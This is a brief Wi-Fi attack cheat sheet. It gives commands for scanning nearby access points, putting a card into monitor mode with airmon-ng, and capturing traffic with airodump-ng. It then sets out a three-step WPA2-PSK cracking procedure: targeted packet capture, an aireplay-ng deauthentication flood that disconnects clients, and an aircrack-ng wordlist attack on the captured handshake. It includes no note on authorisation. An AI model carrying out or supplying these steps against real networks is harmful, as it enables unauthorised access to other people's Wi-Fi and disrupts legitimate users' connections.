# See All Wireless Access Points in Your Area

## Scanning with iwlist
iwlist wlan0 scan

## Scanning with nmcli. This command will also let you connect to an AP
nmcli dev wifi
nmcli dev wifi connect AP-SSID password *APpassword*

## Wi-Fi Recon with aircrack-ng
Before attacking a Wi-Fi AP, you need the MAC address of the target, the MAC address of a client, and the channel the AP is operating on.

To use the tools in the aircrack-ng suite, you will need to put your network card into monitor mode.

airmon-ng start|stop|restart interface.

**airmon-ng start wlan0**

With you wireless card in monitor mode, you can access all the wireless traffic passing by you within the range of your wireless network adapter and antenna (standard is 300-500ft)

**airodump-ng**
The airodump-ng command captures and displays the key data from broadcasting APs and any client connected to those APs or within the vicinity.

**airodump-ng wlan0mon**

You can sniff both 2.4GHz and 5GHz networks, however, your wireless adapter must be able to support both frequencys. To sniff both at the same time:

**airodump-ng --band abg wlan0mon**

## Crack the Wi-Fi Password!

To crack the wi-fi password open three terminals. The following command lines will be run in each terminal.

The below command captures all the packets traversing the AP on channel 10 using the -c option.

1) **airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hackers-ArisePSK wlan0mon**

Use aireplay-ng to knock off (deauthenticate) anyone connected to the AP and force them to reauthenticate. When they reauthenticate, you can capture the hash of their password that is exchanged in the WPA2-PSK four-way handshake.

2) **aireplay-ng --deauth 100 -a 01:01:AA:BB:CC:22 -c A0:A3:E2:44:7C:E5 wlan0mon**

In the third terminal use a password list to crack the passowrd in the captured hash(Hacker-ArisePSK.cap).

3) **aircrack-ng -w wordlist.dic -b 01:01:AA:BB:CC:22 Hacker-ArisePSK.cap**
